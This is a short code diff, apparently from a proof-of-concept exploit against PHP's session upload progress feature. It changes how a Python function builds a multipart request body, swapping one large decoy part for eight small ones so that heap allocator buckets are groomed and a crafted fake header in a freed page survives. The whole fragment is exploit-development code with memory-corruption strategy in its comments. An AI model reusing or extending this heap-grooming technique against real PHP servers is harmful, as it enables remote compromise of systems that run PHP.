@@ -78,14 +78,18 @@ def build_body(gsid, gaddr, sess_token, filedata=b"z" * 4096):
     g = bytearray(g)
     g[0x440:0x440 + len(fs)] = fs
     g = bytes(g)
-    # DECOY part (16384B = 4-page class): its freed buffer becomes the
-    # freelist top so ps_read's bin page takes the DECOY's page 0, not
-    # the groom's (which holds our fake-d header at d+0..0x40).
-    decoy = b"D" * 8191  # 2-page class ONLY (chain: 5121, 8192); never 3-page
+    # SMALL decoy parts (4000B values -> 1-page allocs): each nets a free
+    # 1-page run to bucket[1] (buf1 freed; the estrndup copy persists),
+    # so the FILE_START tree bins and ps_read's page-needs draw from
+    # bucket[1] and NEVER split d's 3-page run (bucket[3] head).
+    decoys = b"".join(part(b"s%d" % i, b"S" * 4000) for i in range(8))
+    # ORDER: small parts FIRST (stock bucket[1] with free 1-page runs),
+    # GROOM LAST (its buf1 takes d from bucket[3]; freed intact with our
+    # bytes), then the file part (its small allocs draw bucket[1], d safe)
     body = (part(b"PHPSESSID", gsid.encode()) +
             part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
+            decoys +
             part(b"g", g) +
-            part(b"dec", decoy) +
             file_part(b"f", filedata) +
             b"--" + BND + b"--\r\n")
     return body
